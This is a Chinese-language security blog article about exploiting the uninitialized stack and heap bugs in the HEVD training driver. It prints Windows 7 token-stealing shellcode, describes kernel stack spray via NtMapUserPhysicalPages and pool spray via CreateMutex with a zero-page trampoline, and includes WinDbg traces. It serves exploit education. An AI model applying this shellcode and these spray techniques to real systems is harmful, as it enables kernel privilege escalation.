<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>HEVD Kernel Exploitation -- Uninitialized Stack &amp; Heap</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">HEVD Kernel Exploitation -- Uninitialized Stack &amp; Heap</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-02-02" class="timeago">7 月，2 周 之前</time>
          <time datetime="2017-02-02" class="fulldate">二月 02, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/bin-security/">二进制安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>作者：k0shl <br> 来源：http://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&-heap.html</p>

<h3>0x00 前言</h3>

<p>我是菜鸟，大牛们请喷T.T</p>

<p>HEVD是HackSys的一个Windows的训练项目，是一个存在漏洞的内核的驱动，里面存在多个漏洞，通过ControlCode控制漏洞类型，这个项目的驱动里几乎涵盖了内核可能存在的所有漏洞，从最基础的栈溢出，到池溢出，释放后重用等等类型，是一个非常好的项目。非常适合我们熟悉理解Windows内核漏洞的原理，利用技巧等等。</p>

<p>项目地址：https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</p>

<p>项目可以通过WDK的build方法直接编译，详细编译方法可以看《0day安全：软件漏洞分析技术》中内核漏洞章第一节内容有介绍，也可以百度直接搜到，通过build方法可以编译出对应版本的驱动.sys，然后通过osrloader工具注册并加载，之后就可以通过Demo来进行调试和提权了。</p>

<p>在这个项目中包含了两种漏洞类型，叫做Uninitialized Stack和Uninitialized Heap，分别是未初始化的栈和未初始化的堆，具体的漏洞形成原因可以通过阅读HEVD项目的源码和说明了解。大致漏洞形成的原因就是在驱动没有对结构体进行初始化，从而导致可以通过提前覆盖内核堆栈的方法控制关键结构体，在没有进行初始化和结构体内容检查的情况下，直接引用结构体的函数指针，最后可以通过提前覆盖的方法控制结构题的函数指针，跳转到提权shellcode，来完成提权。</p>

<p>这篇文章的内容不再分析漏洞成因，成因都非常简单，我将就几方面内容和大家一起分享一下学习成果，第一部分将分享一下HEVD项目中通用的提权shellcode，第二部分将跟大家分享一下j00ru提出的利用NtMapUserPhysicalPages进行kernel stack spray的方法，第三部分我将分享一下HEVD中的一个challenge，是关于未初始化堆空间利用的方法。</p>

<p>HEVD项目中，不仅提供了包含漏洞的驱动源码，还包含了对应利用的Exploit，但是在Uninitialized Heap漏洞中提出了一个challenge。</p>

<p><img alt="" src="https://images.seebug.org/content/images/2017/02/Uninitialized-Heap.png-w331s" /></p>
<p>下面我们一起来开始今天的学习之旅吧！</p>

<h3>0x01 privilege Escalation Shellcode</h3>

<p>关于提权的shellcode方法有很多，看过我之前对于CVE-2014-4113分析的小伙伴一定对替换token的这种方法比较熟悉，在我的那篇分析里，利用替换token这种shellcode是用C来实现的，当然，还有其他方法，比如将ACL置NULL这种方法，今天我还是给大家一起分享一下替换token这种方法，这种方法非常好用也非常常用，HEVD中替换shellcode的方法，是用内联汇编完成的。</p>

<pre><code>VOID TokenStealingPayloadWin7Generic() {
    // No Need of Kernel Recovery as we are not corrupting anything
    __asm {
        pushad                               ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state
    }
}
</code></pre>

<p>这种方法，首先会通过fs段寄存器获取_KTHREAD结构题，fs段寄存器存放了关于线程的各种信息，当处于内核态时，fs的值为0x30，处于用户态时fs值则为0x3b</p>

<pre><code>kd&gt; p

01352782 57              push    edi

kd&gt; p

01352783 60              pushad

kd&gt; p

01352784 33c0            xor     eax,eax

kd&gt; p

01352786 648b8024010000  mov     eax,dword ptr fs:[eax+124h]

kd&gt; dd 0030:00000124

0030:00000124  859615c0
</code></pre>

<p>随后获取到<em>KTHREAD之后，我们可以获取到</em>EPROCESS结构，这个结构中包含了PID等信息，最为关键的是，在内核中是以链表存放的，而这个链表就在_EPROCESS结构中。</p>

<pre><code>kd&gt; dd 859615c0+50

85961610  85a5e538 09000000 00000000 00000000

85961620  00000000 00000037 01000002 00000000

85961630  85961680 82936088 82936088 00000000

85961640  002e5ef3 00000000 7ffdd000 00000000

85961650  006a0008 00000000 859616c8 859616c8

85961660  6751178a 0000006e 00000000 00000000

85961670  00000000 00000000 00000060 82972b00

85961680  859617fc 859617fc 859615c0 843b0690

kd&gt; dt _EPROCESS 85a5e538

ntdll!_EPROCESS

   +0x000 Pcb              : _KPROCESS

   +0x098 ProcessLock      : _EX_PUSH_LOCK

   +0x0a0 CreateTime       : _LARGE_INTEGER 0x1d27c2c`295b0eb9

   +0x0a8 ExitTime         : _LARGE_INTEGER 0x0

   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF

   +0x0b4 UniqueProcessId  : 0x00000c64 Void

   +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x8294a4f0 - 0x843d76a0 ]
</code></pre>

<p>一旦获取了<em>EPROCESS结构，我们能做很多事情，最简单的，观察偏移0xb4位置，存放着当前进程的PID，而0xb8位置，存放着一个</em>LIST_ENTRY结构，这个结构存放着前面一个<em>EPROCESS和后一个</em>EPROCESS，这就很有意思了。</p>

<p>我可以通过这种方法，遍历当前系统所有存在的<em>EPROCESS，而且能够找到System的</em>EPROCESS，实际上，这个_EPROCESS，我们通过Windbg的!process 0 0的方法可以获取到。</p>

<pre><code>kd&gt; dt _LIST_ENTRY 841bdad0+b8

urlmon!_LIST_ENTRY

 [ 0x84e64290 - 0x8294a4f0 ]

   +0x000 Flink            : 0x84e64290 _LIST_ENTRY [ 0x854670e8 - 0x841bdb88 ]

   +0x004 Blink            : 0x8294a4f0 _LIST_ENTRY [ 0x841bdb88 - 0x85a5e5f0 ]



kd&gt; dd 841bdad0+b8

841bdb88  84e64290 8294a4f0 00000000 00000000

841bdb98  00000000 00000000 0000000d 8293db40

841bdba8  00000000 00644000 00246000 00000000

841bdbb8  00000000 00000000 00000000 87a01be8

841bdbc8  87a0130b 00000000 00000000 00000000

841bdbd8  00000000 00000000 841de2e0 00000000

841bdbe8  00000005 00000040 00000000 00000000

841bdbf8  00000000 00000000 00000000 00000000

kd&gt; dt _EPROCESS 84e64290-b8

ntdll!_EPROCESS

   +0x000 Pcb              : _KPROCESS

   +0x098 ProcessLock      : _EX_PUSH_LOCK

   +0x0a0 CreateTime       : _LARGE_INTEGER 0x1d27bbd`9fafafa2

   +0x0a8 ExitTime         : _LARGE_INTEGER 0x0

   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF

   +0x0b4 UniqueProcessId  : 0x00000100 Void

   +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x854670e8 - 0x841bdb88 ]
</code></pre>

<p>回到shellcode，后面有一个loop循环，在循环中做的事情就是不断通过链表的前向指针和后向指针找到System的_EPROCESS结构，也就是＋0xb4位置的PID为4的结构，在结构中存放着token，只要找到System的token，替换掉当前进程的token，就可以完成提权了。</p>

<h3>0x02 NtMapUserPhysicalPages and Kernel Stack Spray</h3>

<p>在下面的调试中，由于我多次重新跟踪调试，所以每次申请的shellcode指针地址都不太一样，但不影响理解。</p>

<p>在HEVD项目中涉及到一种方法，可以进行Kernel Stack Spray，其实在内核漏洞中，未初始化的堆栈这种漏洞相对少，而且在Windows系统中内核堆栈不像用户态的堆栈，是共用的一片空间，因此如果使用Kernel Stack Spray是有一定风险的，比如可能覆盖到某些其他的API指针。在作者博客中也提到这种Kernel Stack Spray是一种比较冷门的方法，但也比较有意思。这里我就和大家一起分析一下，利用NtMapUserPhysicalPages这个API完成内核栈喷射的过程。</p>

<p>为什么要用NtMapUserPhysicalPages，别忘了我们执行提权Exploit的时候，是处于用户态，在用户态时使用的栈地址是用户栈，如果我们想在用户态操作内核栈，可以用这个函数在用户态来完成对内核栈的控制。</p>

<p>j00ru博客对应内容文章地址：http://j00ru.vexillium.org/?p=769</p>

<p>首先我们触发的是Uninitialized Stack这个漏洞，在触发之前，我们需要对内核栈进行喷射，这样可以将shellcode函数指针覆盖到HEVD.sys的结构体中。用到的就是NtMapUserPhysicalPages这个方法。</p>

<p>这个方法存在于ntkrnlpa.exe中，也就是nt!NtMapUserPhysicalPages，首先到达这个函数调用的时候，进入内核态，我们可以通过cs段寄存器来判断，一般cs为0x8时处于内核态，为0x1b时处于用户态。</p>

<pre><code>kd&gt; r cs

cs=00000008



kd&gt; r

eax=00000000 ebx=00000000 ecx=01342800 edx=00000065 esi=85844980 edi=85bd88b0

eip=95327d10 esp=8c1f197c ebp=8c1f1aa8 iopl=0         nv up ei ng nz ac po nc

cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000292
</code></pre>

<p>在此之前，内核栈的情况如下图：</p>

<p><img alt="" src="https://images.seebug.org/content/images/2017/02/stack.jpg-w331s" /></p>
<p>注意esp和ebp，现在处于内核栈中，这时候，我们可以通过对内核栈下写入断点，这样在向栈写入数据，也就是栈喷射时会中断。</p>

<pre><code>kd&gt; g

nt!memcpy+0x33:

82882393 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
</code></pre>

<p>可以看到，在nt!memcpy中断，这时候执行的是一处拷贝操作，这时候通过kb查看一下堆栈回溯。</p>

<pre><code>kd&gt; kb

ChildEBP RetAddr  Args to Child              

94d12af4 82b2131b 94d12c20 003b09f8 00001000 nt!memcpy+0x33

94d12b34 82b1f58d 94d12c20 00000000 00b1fcb8 nt!MiCaptureUlongPtrArray+0x3f

94d13c20 82886db6 00000000 00000400 003b09f8 nt!NtMapUserPhysicalPages+0x9e

94d13c20 77ca6c74 00000000 00000400 003b09f8 nt!KiSystemServicePostCall
</code></pre>

<p>可以看到，函数的调用是NtMapUserPhysicalPages -&gt; MiCaptureUlongPtrArray -&gt; memcpy，来看一下这个过程的函数实现，首先是nt!NtMapUserPhysicalPages</p>

<pre><code>NTSTATUS __stdcall NtMapUserPhysicalPages(PVOID BaseAddress, PULONG NumberOfPages, PULONG PageFrameNumbers)

  if ( (unsigned int)NumberOfPages &gt; 0xFFFFF )

    return -1073741584;

  BaseAddressa = (unsigned int)BaseAddress &amp; 0xFFFFF000;

  v33 = ((_DWORD)NumberOfPages &lt;&lt; 12) + BaseAddressa - 1;

  if ( v33 &lt;= BaseAddressa )

    return -1073741584;

  v4 = &amp;P;//栈地址

  v39 = 0;

  v37 = &amp;P;

  if ( PageFrameNumbers )

  {

    if ( !NumberOfPages )

      return 0;

    if ( (unsigned int)NumberOfPages &gt; 0x400 )//如果要超过1024，就要扩展池，不过这里不用

    {

      v4 = (char *)ExAllocatePoolWithTag(0, 4 * (_DWORD)NumberOfPages, 0x77526D4Du);

      v37 = v4;

      if ( !v4 )

        return -1073741670;

    }

    v5 = MiCaptureUlongPtrArray((int)NumberOfPages, (unsigned int)PageFrameNumbers, v4);//v4 要拷贝的目标 内核栈  a2，要覆盖的EoPBuffer  长度是4*NumberOfPages
</code></pre>

<p>对应的注释已经标记，在函数中调用了MiCaptureUlongPtrArray，会将传入NtMapUserPhysicalPages的参数，长度也就是NumberOfPages，内容也就是PageFrameNumbers(详情请参考Exploit中的UninitializedStackVariable.c)，然后进入MiCaptureUlongPtrArray。</p>

<pre><code>int __fastcall MiCaptureUlongPtrArray(int a1, unsigned int a2, void *a3)

{

  size_t v3; // ecx@1



  v3 = 4 * a1;

  if ( v3 )

  {

    if ( a2 &amp; 3 )

      ExRaiseDatatypeMisalignment();

    if ( v3 + a2 &gt; (unsigned int)MmUserProbeAddress || v3 + a2 &lt; a2 )

      *(_BYTE *)MmUserProbeAddress = 0;

  }

  memcpy(a3, (const void *)a2, v3);

  return 0;

}
</code></pre>

<p>进入后，会将shellcode的内容拷贝到a3，也就是&amp;P，内核栈中。</p>

<pre><code>kd&gt; p

nt!memcpy+0x35:

82882395 ff2495ac248882  jmp     dword ptr nt!memcpy+0x14c (828824ac)[edx*4]

kd&gt; dd 94d139e4

94d139e4  00c62800 00c62800 00c62800 00c62800

94d139f4  00c62800 00c62800 00c62800 00c62800

94d13a04  00c62800 00c62800 00c62800 00c62800

94d13a14  00c62800 00c62800 00c62800 00c62800

94d13a24  00c62800 00c62800 00c62800 00c62800
</code></pre>

<p>memcpy之后，可以看到栈地址空间被喷射上了shellcode的指针，接下来触发漏洞，关于触发的原理阅读HEVD.sys源码很清晰，这里不详细介绍，大致就是当传入的UserValue，和漏洞的MagicValue不一样的情况下，就可以引发未初始化变量。</p>

<pre><code>kd&gt; p

HEVD+0x2cac:

95327cac 8b95ecfeffff    mov     edx,dword ptr [ebp-114h]



kd&gt; dd ebp-114

8c1f1994  baadf00d 01342800 01342800 01342800

8c1f19a4  01342800 01342800 01342800 01342800

8c1f19b4  01342800 01342800 01342800 01342800

8c1f19c4  01342800 01342800 01342800 01342800

8c1f19d4  01342800 01342800 01342800 01342800

8c1f19e4  01342800 01342800 01342800 01342800

8c1f19f4  01342800 01342800 01342800 01342800
</code></pre>

<p>在进入HEVD的Trigger函数之后，可以看到此时内核栈已经被覆盖，这时候UserValue的值，也就是我们可控的值是baadf00d，随后看一下StackVariable结构体的内容。</p>

<pre><code>kd&gt; p

HEVD+0x2ccc:

95327ccc e853d8ffff      call    HEVD+0x524 (95325524)

kd&gt; r eax

eax=8c1f1998

kd&gt; dd 8c1f1998

8c1f1998  01342800 01342800 01342800 01342800

8c1f19a8  01342800 01342800 01342800 01342800

8c1f19b8  01342800 01342800 01342800 01342800

8c1f19c8  01342800 01342800 01342800 01342800
</code></pre>

<p>随后会对UserValue和MagicValue进行比较。</p>

<pre><code>kd&gt; p

HEVD+0x2cda:

95327cda 3b4de0          cmp     ecx,dword ptr [ebp-20h]

kd&gt; p

HEVD+0x2cdd:

95327cdd 7516            jne     HEVD+0x2cf5 (95327cf5)

kd&gt; r ecx

ecx=baadf00d

kd&gt; dd ebp-20

8c1f1a88  bad0b0b0
</code></pre>

<p>UserValue是baadf00d，而HEVD.sys的MagicValue的值是bad0b0b0，不相等的情况下，不会对之前的StackVariable结构体中的成员变量初始化，而此时成员变量的值都被shellcode覆盖，最后引用，导致在内核态进入shellcode。</p>

<pre><code>kd&gt; p

HEVD+0x2d33:

95327d33 ff95f4feffff    call    dword ptr [ebp-10Ch]



kd&gt; dd ebp-10c

8c1f199c  01342800



01342800 55              push    ebp

01342801 8bec            mov     ebp,esp

01342803 83e4f8          and     esp,0FFFFFFF8h

01342806 83ec34          sub     esp,34h

01342809 33c0            xor     eax,eax

0134280b 56              push    esi

0134280c 33f6            xor     esi,esi
</code></pre>

<p>最后在内核态执行shellcode，替换当前进程token为System token，完成提权。</p>

<p><img alt="" src="https://images.seebug.org/content/images/2017/02/success.png-w331s" /></p>
<h3>0x03 Uninitialized Stack &amp; Heap</h3>

<p>最后就是关于这次challenge了，其实这个challenge非常好理解，如果做过浏览器或者其他跟堆有关漏洞的小伙伴肯定第一时间想到的就是Heap Spray，没错，堆喷！</p>

<p>利用内核堆喷，我们可以完成对堆结构的控制，最后完成提权，在文章最后，我放一个我修改了UninitializedHeapVariable对应Exploit内容的项目地址，可以利用我的这个项目地址完成提权。</p>

<p>但是，内核堆喷和应用层的堆喷不太一样，要解决两个问题，第一个shellcode放在哪里，第二个如何在用户态向内核堆进行喷射。</p>

<p>解决问题的关键在于NtAllocateVirtualMemory和CreateMutex，首先NtAllocateVirtualMemory对于内核熟悉的小伙伴肯定不会陌生，看过我前面两篇内核调试学习的小伙伴也不会陌生，在很多内核漏洞利用场景中，都会用到这个函数，这个函数可以用来申请零页内存，来完成shellcode的布局。</p>

<p>如何布局是一个问题，这里来看一下漏洞触发位置的调用。</p>

<pre><code>92319abd 83c408          add     esp,8

92319ac0 8b4ddc          mov     ecx,dword ptr [ebp-24h]

92319ac3 8b5104          mov     edx,dword ptr [ecx+4]

92319ac6 ffd2            call    edx {00460046}
</code></pre>

<p>如果我们能够控制edx的话，这里调用的就是刚才通过NtAllocateVirtualMemory申请的内存，这里可以直接往这里面存放shellcode，可是我从老外那学到了一种方法，就是获取shellcode的函数入口指针，然后这里存放68+addr+c3的组合，这样call调用后，执行的内容就是。</p>

<pre><code>kd&gt; t

00640066 68b0141401      push    11414B0h

kd&gt; p

0064006b c3              ret
</code></pre>

<p>这样，相当于将shellcode入口指针入栈，esp变成shellcode指针，然后ret，之后就会跳转到shellcode中执行shellcode，这样对于NtAllocateVirtualMemory布局操作就简单很多。</p>

<p>这样，我们只需要申请一个零页空间就行了。</p>

<pre><code>kd&gt; dd 00460046

00460046  35278068 0000c301
</code></pre>

<p>布置上我们的push shellcode addr;ret</p>

<p>然后就是关键的CreateMutex，这个会创建互斥体，我们申请多个互斥体，完成对堆的布局。</p>

<pre><code>kd&gt; p

KernelBase!CreateMutexA+0x19:

001b:75961675 e809000000      call    KernelBase!CreateMutexExA (75961683)

kd&gt; dd esp

0099e73c  00000000 0099f788 00000001 001f0001

0099e74c  0099f81c 0110320e 00000000 00000001

0099e75c  0099f788 9c1c5b57 00000000 00000000

0099e76c  00000000 00000000 00000000 00000000

0099e77c  00000000 00000000 00000000 00000000

0099e78c  00000000 00000000 00000000 00000000

0099e79c  00000000 00000000 00000000 00000000

0099e7ac  00000000 00000000 00000000 00000000



kd&gt; dc 99f788

0099f788  46464646 67716870 656d7568 6e6c7961  FFFFphqghumeayln

0099f798  7864666c 63726966 78637376 77626767  lfdxfircvscxggbw

0099f7a8  716e666b 77787564 6f666e66 7273767a  kfnqduxwfnfozvsr

0099f7b8  706a6b74 67706572 70727867 7976726e  tkjprepggxrpnrvy

0099f7c8  776d7473 79737963 70716379 6b697665  stmwcysyycqpevik

0099f7d8  6d666665 6d696e7a 73616b6b 72737776  effmznimkkasvwsr

0099f7e8  6b7a6e65 66786379 736c7478 73707967  enzkycxfxtlsgyps

0099f7f8  70646166 00656f6f 9c1c5b57 0099e760  fadpooe.W[..`...
</code></pre>

<p>申请多个互斥体后，可以看到对池空间的控制。可以看到，第一个参数是mutexname，这个前面必须包含46，这样才能进行函数调用后，在pool中覆盖到00460046的值。</p>

<pre><code>kd&gt; r eax

eax=a6630b38

kd&gt; !pool a6630b38

Pool page a6630b38 region is Paged pool

 a6630000 size:  100 previous size:    0  (Allocated)  IoNm

 a6630100 size:    8 previous size:  100  (Free)       0.4.

 a6630108 size:  128 previous size:    8  (Allocated)  NtFs

 a6630230 size:    8 previous size:  128  (Free)       Sect

 a6630238 size:   18 previous size:    8  (Allocated)  Ntf0

 a6630250 size:   38 previous size:   18  (Allocated)  CMVa

 a6630288 size:   68 previous size:   38  (Allocated)  FIcs

 a66302f0 size:   f8 previous size:   68  (Allocated)  ObNm

 a66303e8 size:  138 previous size:   f8  (Allocated)  NtFs

 a6630520 size:  100 previous size:  138  (Allocated)  IoNm

 a6630620 size:  128 previous size:  100  (Free)       ObNm

 a6630748 size:   68 previous size:  128  (Allocated)  FIcs

 a66307b0 size:  380 previous size:   68  (Allocated)  Ntff

*a6630b30 size:   f8 previous size:  380  (Allocated) *Hack

        Owning component : Unknown (update pooltag.txt)
</code></pre>

<p>这里a6630b30中包含了8字节的pool header，和0xf0的nopage pool，通过CreateMutex，我们会对kernel pool占用。</p>

<pre><code>
kd&gt; dd a6630b38

a6630b38  00000000 00460046 00780069 00620074

a6630b48  0074006b 00770065 00630071 006a0078

a6630b58  00740065 00720063 00730061 006a007a

a6630b68  006e0065 00790070 006a0064 00680061

a6630b78  00710067 00660072 006c007a 0079006f

a6630b88  007a0075 0068006f 00760074 006a0078

a6630b98  006b0063 00730073 00750064 00770077
</code></pre>

<p>可以看到，现在头部结构已经被00460046占用，接下来，还是由于UserValue和MagicValue的原因，引发Uninitialized Heap Variable。</p>

<pre><code>kd&gt; g

Breakpoint 1 hit

HEVD+0x299e:

9231999e ff1598783192    call    dword ptr [HEVD+0x898 (92317898)]

kd&gt; p

HEVD+0x29a4:

923199a4 8945dc          mov     dword ptr [ebp-24h],eax

kd&gt; dd eax

889f8610  00000000 00460046 00780069 00620074



kd&gt; dd 00460046

00460046  35278068 0000c301
</code></pre>

<p>随后由于池中结构体的内容未初始化，内核池中存放的还是我们通过CreateMutex布置的内容，直接引用会跳转到我们通过NtAllocateVirtualMemory申请的空间。</p>

<pre><code>kd&gt; p

HEVD+0x2ac0:

95327ac0 8b4ddc          mov     ecx,dword ptr [ebp-24h]

kd&gt; p

HEVD+0x2ac3:

95327ac3 8b5104          mov     edx,dword ptr [ecx+4]

kd&gt; r ecx

ecx=a86c5580

kd&gt; p

HEVD+0x2ac6:

95327ac6 ffd2            call    edx

kd&gt; t

00460046 68b0141401      push    11414B0h

kd&gt; p

0064006b c3              ret

kd&gt; p

011414b0 53              push    ebx





011414b0 53              push    ebx

011414b1 56              push    esi

011414b2 57              push    edi

011414b3 60              pushad

011414b4 33c0            xor     eax,eax

011414b6 648b8024010000  mov     eax,dword ptr fs:[eax+124h]

011414bd 8b4050          mov     eax,dword ptr [eax+50h]

011414c0 8bc8            mov     ecx,eax
</code></pre>

<p>随后push shellcode之后，esp的值被修改，直接ret会跳转到shellcode address，执行提权。</p>

<p><img alt="" src="https://images.seebug.org/content/images/2017/02/final.png-w331s" /></p>
<p>最后我贴上更新后的项目代码。</p>

<p>https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Source_with_Unin_Heap_Variable_Chall</p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/200/">https://paper.seebug.org/200/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/199/"><span aria-hidden="true">&larr;</span> Jenkins-LDAP (CVE-2016-9299...</a>
    
    
      <a class="older-posts" href="/201/">从CVE-2016-7644回到CVE-2016-4669 <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
